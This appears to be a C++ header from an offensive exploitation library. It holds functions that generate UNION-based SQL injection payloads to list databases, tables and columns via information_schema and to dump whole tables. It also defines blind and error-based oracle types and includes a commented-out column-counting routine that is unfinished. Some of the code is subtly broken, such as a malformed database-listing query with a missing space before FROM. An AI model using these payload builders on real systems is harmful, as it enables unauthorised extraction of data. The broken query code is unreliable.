#pragma once

#include <murk/flow.hpp>

#include <variant>

namespace murk::xplt::sql {

  enum class type {
    number,
    time,
    character,
    string,
    binary,
    image
  };

  namespace errors {
    struct wrong_type {
      type given;
      type expected;
    };
  };

  using error_t = std::variant<errors::wrong_type>;

  using blind_oracle = flow_t<std::string_view, bool>;
  using error_oracle = flow_t<std::string_view, error_t>;

//  size_t count_columns(blind_oracle sql_is_ok) {
//    std::string req;
//    bool first = true;
//    size_t len = 0;
//    do {
//      req = "UNION SELECT"
//      for (auto i = 0; i < len; ++i) {

//      }
//      ++len;
//      // Remove comment
//      req.insert(req.size() - 2, "NULL");
//      if (first)
//        first = false;
//      else
//        req.insert(req.size() - 2, ",");

//      req.insert(req.size() - 2, " ");
//    }
//    while (!sql_is_ok(req));

//    return len;
//  }

  std::string grab_all_columns_v(std::string_view table_name) {
    return fmt::format("UNION SELECT * FROM {}--", table_name);
  }

  std::string list_fields_v(std::string_view columns, std::string_view table, size_t fields = 1) {
    std::string ret = "UNION SELECT ";
    for (size_t i = 0; i < fields; ++i)
      ret += fmt::format("GROUP_CONCAT({}),", columns);
    ret.pop_back();
    ret += fmt::format(" FROM {}", table);
    return ret;
  }

  std::string list_columns_v(std::string_view table, size_t fields = 1) {
    std::string ret = "UNION SELECT ";
    for (size_t i = 0; i < fields; ++i)
      ret += "GROUP_CONCAT(column_name),";
    ret.pop_back();
    ret += fmt::format(" FROM information_schema.columns WHERE table_name='{}'", table);
    return ret;
  }

  std::string list_tables_v(std::string_view db, size_t fields = 1) {
    std::string ret = "UNION SELECT ";
    for (size_t i = 0; i < fields; ++i)
      ret += "GROUP_CONCAT(table_name),";
    ret.pop_back();
    ret += fmt::format(" FROM information_schema.tables WHERE table_schema='{}'", db);
    return ret;
  }

  std::string list_dbs_v(size_t fields = 1) {
    std::string ret = "UNION SELECT ";
    for (size_t i = 0; i < fields; ++i)
      ret += "GROUP_CONCAT(information_schema.tables),";
    ret.pop_back();
    ret += "FROM information_schema.schemata";
    return ret;
  }
}
